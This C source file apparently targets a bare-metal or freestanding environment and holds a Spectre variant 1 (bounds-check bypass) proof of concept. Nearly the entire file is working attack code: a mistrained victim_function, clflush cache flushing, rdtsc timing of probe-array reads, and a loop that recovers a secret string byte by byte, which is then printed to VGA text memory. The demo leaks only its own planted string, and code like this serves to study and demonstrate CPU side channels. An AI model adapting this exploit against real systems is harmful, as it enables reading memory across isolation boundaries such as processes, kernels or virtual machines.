typedef unsigned long         size_t;
typedef unsigned int          uint32_t;
typedef unsigned long long    uint64_t;
typedef unsigned char         uint8_t;
typedef unsigned short int    uint16_t;
//*****************************************************************************
enum color {
    BLACK = 0,
    BRIGHT = 7
};

enum size {
    COLS = 80,
    ROWS = 25
};

uint16_t *const video = (uint16_t*) 0xB8000;

void putc(uint8_t x, uint8_t y, enum color fg, enum color bg, char c) {
    video[y * COLS + x] = (bg << 12) | (fg << 8) | c;
}

void puts(uint8_t x, uint8_t y, enum color fg, enum color bg, const char *s) {
    for (; *s; s++, x++)
        putc(x, y, fg, bg, *s);
}
void print_number(uint8_t x,uint8_t y,uint8_t  num){
  char buffer[20];
  char res[20];
  int i=0;
  while(num>0){
    buffer[i++]='0'+num%10;
    num/=10;
  }
  buffer[i]='\0';
  int j,len=i;
  for(j=0;j<len;++j){
    res[j]=buffer[len-j-1];
  }
  res[j]='\0';
  puts(x,y,BRIGHT,BLACK,res);
}
void clear(enum color bg) {
    uint8_t x, y;
    for (y = 0; y < ROWS; y++)
        for (x = 0; x < COLS; x++)
            putc(x, y, bg, bg, ' ');
}
//*********************************************************************************
static inline void flush(void *p){
  __asm__ volatile("clflush 0(%0)" : : "r"(p) : "eax");
}
static inline void fence() { __asm__ volatile ("mfence"); }
static inline uint64_t rdtsc(){
  uint64_t a=0;
  __asm__ volatile("mfence");
  __asm__ volatile("rdtsc":"=A"(a));
  __asm__ volatile("mfence");
  return a;
}
static inline uint64_t rdtscp(uint32_t *p){
  uint32_t lo,hi;
  __asm__ volatile("rdtscp" : "=a"(lo), "=d"(hi));
  *p=lo;
  return ((uint64_t)lo | ((uint64_t)hi)<<32);
}
int _strlen(const char *str) {
	int i = 0;
	while (str[i] != 0)
		i++;
	return i;
}
/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char* secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (158) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	uint64_t time1, time2;
	uint8_t* addr;
        
	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			//_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
			flush(&array2[i * 512]);

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			//_mm_clflush(&array1_size);
			flush(&array1_size);
                       for (volatile int z = 0; z < 100; z++)
			{
			} 
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			
			time1=rdtsc();
			
			junk = *addr; /* MEMORY ACCESS TO TIME */			
			
			time2=rdtsc()-time1;
			
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}
//*********************************************************************************
int __attribute__((noreturn)) main() {
    	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int idx=0;
	int score[2],len = _strlen(secret);
	uint8_t value[2];
        char res[len];
        
	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
        
	while (--len >= 0)
	{
		readMemoryByte(malicious_x++, value, score);
		//res[idx++]=value[0];
		res[idx++]=(value[0] > 31 && value[0] < 127) ? value[0] :'?';	
	}
	res[idx]='\0';
        clear(BLACK);
        puts(0, 0, BRIGHT, BLACK, res);
        while (1);
}
